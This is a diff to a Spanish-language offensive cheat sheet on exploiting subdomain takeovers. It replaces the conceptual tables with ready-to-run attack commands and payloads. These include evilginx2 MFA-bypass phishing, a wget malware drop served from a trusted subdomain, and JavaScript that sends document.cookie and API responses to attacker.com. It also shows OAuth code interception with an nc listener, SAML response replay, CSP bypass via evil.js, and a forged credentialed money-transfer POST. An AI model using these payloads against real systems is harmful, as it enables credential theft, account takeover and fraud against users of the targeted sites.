@@ -23,141 +23,102 @@ linked:
 
 ## Phishing con Subdomain Legítimo
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Trust transfer | Subdomain takeover = atacante "es" target.com | Visual + DNS legítimo. |
-| Phishing fake login | Atacante hostea fake login en `login.target.com` | Standard credential theft. |
-| Fake reset page | Reset URL dirigido a takeover subdomain | High-yield. |
-| HTTPS valid cert | Get Let's Encrypt cert for owned subdomain | Padlock visible. |
-| Email-style phishing | Send emails con links a `mail-target.target.com` | Email spoofing. |
-| OAuth flow phishing | Fake OAuth provider on subdomain | Mass user. |
-| Malware distribution | `download.target.com` con malicious bin | High trust binary. |
-| Combine con email | "Update at https://account.target.com" → takeover redir | Standard. |
-| App store / mobile | Mobile deep links via subdomain | Mobile chain. |
-| API endpoint spoofing | `api.target.com` returns malicious | App-level. |
-| Mass email campaign | Bulk send con takeover URL | Scale. |
-| Brand reputation damage | Defacement visible | Public PR. |
-| SEO poisoning | Index'd page con malicious | Long-term. |
-| Combine con search engine | Display in Google results legitimately | Reach. |
+| `certbot --apache -d login.target.com --email me@me.com --agree-tos` | Let's Encrypt cert para subdomain reclamado | HTTPS valid → padlock visible. |
+| Configurar fake login form en `login.target.com` post-takeover | Credential phishing landing | Standard credential theft. |
+| `python3 -c "import smtplib; ..."` con link `https://reset.target.com/reset?t=fake` | Email phishing con subdomain legítimo | High-yield credential theft. |
+| `gophish` campaign apuntando a takeover subdomain | Mass email phishing | Bulk attack. |
+| `evilginx2 -p phishlets/` con subdomain reclamado | MITM phishing con session capture | Auto bypass MFA. |
+| Subir webshell `wget https://attacker/payload.exe -O /var/www/x.exe && chmod +x x.exe` y servir desde `download.target.com` | High-trust binary distribution | Malware distribution. |
+| Defacement: `echo "<h1>Owned</h1>" > /var/www/index.html` | PR / brand damage PoC | Demonstration. |
 ^sdt-vector-phishing
 
 ___
 
 ## Cookie Scope Abuse (Domain=`.target.com`)
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Cookies con `Domain=.target.com` enviadas a TODAS subdomains. Atacante con subdomain control reads/sets these cookies. | Standard cookie scope. |
-| Read victim's session cookie | Atacante page en takeover sub → JS reads parent domain cookies | If not HttpOnly. |
-| Set malicious cookie | Atacante sets cookie en parent domain | Session fixation. |
-| CSRF token theft | If CSRF token en cookie con domain wide | CSRF chain. |
-| Authentication cookie steal | Direct ATO if session cookie accessible | Major impact. |
-| HttpOnly bypass | XSS sub → read cookies inaccessible to fetch but accessible same-site | XSS combo. |
-| Subdomain isolation breakage | Apps assume subdomain isolation → atacante breaks | Architectural flaw. |
-| Combine con XSS | XSS en takeover sub + parent cookies | Standard chain. |
-| Cookie tossing | Atacante sets cookie con specific path → overrides parent | Edge. |
-| Combine con CSRF | Cookie set + cross-site request | Combo. |
-| `__Host-` prefix immune | Cookies con `__Host-` no permite Domain attr | Defense. |
-| `__Secure-` prefix | Less restrictive but HTTPS-only | Defense. |
+| `<script>fetch('https://attacker.com/log',{method:'POST',body:document.cookie})</script>` en takeover subdomain | Read parent domain cookies (sin HttpOnly) | Cookie con `Domain=.target.com`. |
+| `document.cookie = "session=ATTACKER_SESSION; Domain=.target.com; Path=/"` | Set cookie en parent domain | Session fixation. |
+| `<script>document.cookie = "csrf_token=ATTACKER_TOKEN; Domain=.target.com"</script>` | CSRF token cookie tossing | Combine con CSRF. |
+| `curl -sI https://target.com/login \| grep -i set-cookie` | Verificar atributos cookie (HttpOnly, Domain, Secure, SameSite) | Pre-attack analysis. |
+| `<script>const c=document.cookie.split(';').filter(x=>x.includes('session'))[0]; new Image().src='https://attacker.com/exfil?c='+encodeURIComponent(c)</script>` | Image-based exfil | Stealth alternative. |
+| `Set-Cookie: session=ATK; Domain=.target.com; Path=/` (server-set en takeover) | Server-side cookie set | Pre-flight session fixation. |
 ^sdt-vector-cookie
 
 ### PoC cookie steal via takeover
 
 ```html
-<!-- Atacante hostea en takeover-sub.target.com -->
+<!-- En takeover-sub.target.com -->
 <script>
-  // Cookies del parent domain accessible
-  // Si HttpOnly = false
   fetch('https://attacker.com/log', {
     method: 'POST',
-    body: document.cookie
+    body: JSON.stringify({
+      cookies: document.cookie,
+      url: location.href,
+      ua: navigator.userAgent
+    })
   });
 </script>
 ```
-
-Victim navigates a `https://takeover-sub.target.com/x` (atacante's content):
-- HTTPS cert valid
-- Same registrable domain → cookies de parent enviadas
-- JS lee cookies si no HttpOnly
-- Exfil a atacante
 
 ___
 
 ## OAuth `redirect_uri` Trust Transfer
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | OAuth IdP whitelists `*.target.com` for redirect_uri. Atacante owns takeover subdomain → claims redirect_uri → receives auth code. | High impact ATO. |
-| Wildcard redirect_uri | `*.target.com` allows any subdomain | Standard misconfig. |
-| Specific subdomain whitelist | If specific dangling subdomain whitelisted | Direct. |
-| Code interception | OAuth code arrives a takeover subdomain | Atacante exchange. |
-| Token theft (implicit flow) | `response_type=token` → access_token in fragment | Direct theft. |
-| Combine con state CSRF | If state missing | Combine. |
-| OpenID nonce reuse | Cross-subdomain trust | Edge. |
-| Federated identity (SAML) | Same concept con SAML SP | SAML below. |
-| Multiple IdPs | Try multiple OAuth providers | Bulk. |
-| Mobile app redirect_uri | Mobile clients also whitelist | Mobile combo. |
-| Combine con HHI | If app builds redirect_uri from Host | Compound. |
-| Verify with auth audit | Check OAuth/OIDC config of IdP | Pre-auth recon. |
+| `https://idp.target.com/oauth/authorize?client_id=APP&redirect_uri=https://taken.target.com/cb&response_type=code&scope=email` | Code grant interceptado en takeover | Wildcard `*.target.com` whitelist. |
+| `https://idp.target.com/oauth/authorize?response_type=token&client_id=APP&redirect_uri=https://taken.target.com#access_token=...` | Implicit flow → token directo en fragment | response_type=token habilitado. |
+| `nc -lvnp 443` en takeover sub para capturar `?code=` | Listener post-redirect | Setup phishing flow. |
+| `curl -X POST https://idp.target.com/oauth/token -d "code=$STOLEN&client_id=APP&client_secret=$LEAK&redirect_uri=https://taken.target.com/cb"` | Exchange code por access_token | Public client / secret leaked. |
+| `curl -H "Authorization: Bearer $TOKEN" https://api.target.com/me` | Acceso API como víctima | Post-token. |
+| Setup mobile redirect: `intent://taken.target.com/cb#Intent;scheme=https;...` | Mobile OAuth flow takeover | Mobile chain. |
 ^sdt-vector-oauth
 
 ___
 
 ## CSP Subdomain Bypass
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | CSP `script-src` lists trusted subdomains. Atacante con takeover sub sirve malicious JS → bypass CSP. | XSS via CSP holes. |
-| `script-src *.target.com` | Wildcard subdomain → atacante's takeover loads JS | Standard. |
-| `script-src cdn.target.com` | If specific subdomain takeover | Direct. |
-| Bypass strict CSP via script | Use takeover sub para serve scripts | Common. |
-| `style-src` subdomain | CSS injection via takeover | Edge. |
-| `frame-src` subdomain | Iframe injection con takeover content | Phishing combo. |
-| `connect-src` subdomain | Fetch / WebSocket to takeover | Data exfil. |
-| `img-src` subdomain | Image-based exfil/tracking | Beacon. |
-| Combine con XSS principal | XSS en main app + takeover sub for JS source | Source chain. |
-| Bypass nonce | Subdomain bypasses nonce requirement (in some configs) | Edge. |
-| `base-uri` subdomain | Base href hijack via subdomain | Combine HTML inj. |
-| Vendor scripts subdomain | Trusted analytics/tracking subdomain | Common. |
+| `curl -sI https://target.com \| grep -i content-security-policy` | Lista CSP directives + sources | Pre-attack CSP analysis. |
+| Verificar `script-src *.target.com` en CSP → identificar takeover sub | CSP source whitelisted | Standard CSP bypass setup. |
+| Hostear `evil.js` en `cdn.target.com` (taken) post-takeover | Script source whitelisted | XSS via subdomain. |
+| Inyectar `<script src="https://taken.target.com/evil.js"></script>` en XSS | XSS bypass strict CSP | Combo XSS + SDT. |
+| `<iframe src="https://taken.target.com/phish.html"></iframe>` | Frame-src bypass | UI redress. |
+| `fetch('https://taken.target.com/exfil', {method:'POST', body:document.cookie})` con CSP `connect-src *.target.com` | Data exfil via connect-src | Data egress. |
+| `<base href="https://taken.target.com/">` (HTML injection) | base-uri hijack | Path-relative URL abuse. |
 ^sdt-vector-csp
 
 ___
 
 ## SAML SP / IdP Trust
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | SAML federation trusts specific subdomains as SPs (Service Providers) or IdPs (Identity Providers). Takeover broke trust. | Federated identity. |
-| SP ACS URL takeover | Atacante's takeover sub claims as SP | SAML responses arrive a atacante. |
-| IdP metadata takeover | If IdP metadata endpoint dangling | Atacante hosts malicious metadata. |
-| AssertionConsumerService URL | Subdomain con ACS endpoint takeover | Token receive. |
-| SAML logout URL | Logout redirect a takeover | Force logout + phish. |
-| SAML single-sign-on URL | Combine con state | Edge. |
-| OpenID Connect equivalent | Same concept | Modern. |
-| Federation circle of trust | Multi-org SSO | Wider impact. |
-| Service-to-service auth | Internal SAML | Hidden vector. |
-| Combine con weak SAML signing | Weak crypto + takeover | Compound. |
-| Combine con XML signature wrap | XSW + takeover | Edge complex. |
+| `curl https://idp.target.com/saml/metadata \| xmllint --xpath '//AssertionConsumerService/@Location'` | Lista ACS URLs trusted | SAML SP recon. |
+| Hostear malicious SAML SP en takeover subdomain con `AssertionConsumerService` URL | Recibir SAML responses con asserciones | SP ACS URL takeover. |
+| Hostear malicious IdP metadata XML en takeover sub | Atacante's SAML IdP trusted | IdP metadata takeover. |
+| `samltool.com` o `python3 -c "from saml2 import ..."` para parse SAML response capturada | Decode SAML assertion + extract user attrs | Post-capture. |
+| Hostear malicious logout URL en takeover sub | Force logout + phish chain | SAML logout. |
+| Replay SAML response con `curl -X POST -d "SAMLResponse=$CAPTURED" https://victim/sp/saml` | SAML replay post-capture | Auth bypass. |
 ^sdt-vector-saml
 
 ___
 
 ## CORS Allowlist Abuse
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | CORS config trusts subdomains. Atacante takeover sub → atacante's JS makes cross-origin requests con credentials. | CORS bypass. |
-| `Access-Control-Allow-Origin: *.target.com` | Wildcard | Standard. |
-| `Access-Control-Allow-Credentials: true` con allowed Origin | Cookies sent | High impact. |
-| Attacker subdomain origin | Origin: `https://takeover.target.com` | Direct. |
-| Read sensitive API data | API trusts subdomain origin → CORS allows fetch with cookies | Data exfil. |
-| Trigger sensitive actions | POST to API endpoints | CSRF + CORS. |
-| Combine con auth tokens | CSRF token also leaked | Compound. |
-| Internal API exposure | Internal-only APIs sometimes trust *.internal.target.com | Lateral. |
-| Postmessage origin trust | window.postMessage acceptaria origins | Edge. |
-| WebSocket Origin check | WS handshake con Origin header | Real-time. |
-| Combine con OAuth | OAuth + CORS misconfig + takeover | Multi-vector. |
-| Reflected Origin con preflight | Server reflects Origin → atacante's domain accepted | Common bug. |
+| `curl -sI -H "Origin: https://taken.target.com" https://api.target.com/data \| grep -i access-control` | Verifica CORS reflejado para takeover origin | CORS allowlist `*.target.com`. |
+| Verificar `Access-Control-Allow-Credentials: true` + `Access-Control-Allow-Origin: <taken>` | High-impact CORS misconfig | Cookie-bearing requests. |
+| `<script>fetch('https://api.target.com/data', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker?d='+encodeURIComponent(d)))</script>` en takeover sub | Read sensitive API data con cookies víctima | Data exfil. |
+| `<script>fetch('https://api.target.com/transfer', {method:'POST', credentials:'include', body:JSON.stringify({to:'attacker',amount:1000}), headers:{'Content-Type':'application/json'}})</script>` | Trigger sensitive action via CORS | CSRF + CORS combo. |
+| `<script>const ws=new WebSocket('wss://api.target.com/socket'); ws.onopen=()=>...</script>` en takeover sub | CSWSH (WebSocket CSRF) via subdomain trust | WS Origin check. |
+| `<script>window.addEventListener('message', e => fetch('//attacker?'+JSON.stringify(e.data))); window.parent.postMessage('test','*');</script>` | postMessage bypass via Origin trust | Cross-window. |
 ^sdt-vector-cors
 
 ***
